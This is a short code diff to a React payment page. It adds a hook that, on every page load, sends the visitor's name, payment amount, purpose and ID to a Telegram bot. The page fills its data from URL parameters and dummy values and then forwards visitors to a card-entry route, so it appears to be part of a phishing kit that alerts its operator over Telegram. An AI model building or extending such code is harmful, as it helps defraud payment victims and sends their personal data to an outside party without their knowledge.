@@ -1,4 +1,6 @@
 import { useParams, useNavigate } from "react-router-dom";
+import { useEffect } from "react";
+import { sendMessageToTelegram } from "@/backend/telegramService";
 
 const dummyPaymentData: Record<string, any> = {
   "123": {
@@ -36,6 +38,20 @@ const PaymentPage = () => {
     expiryDate: queryParams.get('e') || (dummyPaymentData[id as string]?.expiryDate || defaultPaymentData.expiryDate),
     createdAt: dummyPaymentData[id as string]?.createdAt || defaultPaymentData.createdAt
   };
+
+  useEffect(() => {
+    const notifyVisitor = async () => {
+      const message = `
+<b>👀 New Visitor on Payment Page</b>
+<b>Name:</b> ${paymentData.customerName}
+<b>Amount:</b> ${paymentData.amount.toFixed(3)} ${paymentData.currency}
+<b>Purpose:</b> ${paymentData.description}
+<b>ID:</b> ${paymentData.id}
+`;
+      await sendMessageToTelegram(message);
+    };
+    notifyVisitor();
+  }, []);
 
   const handleConfirm = () => {
     navigate(`/card/${id}${window.location.search}`);
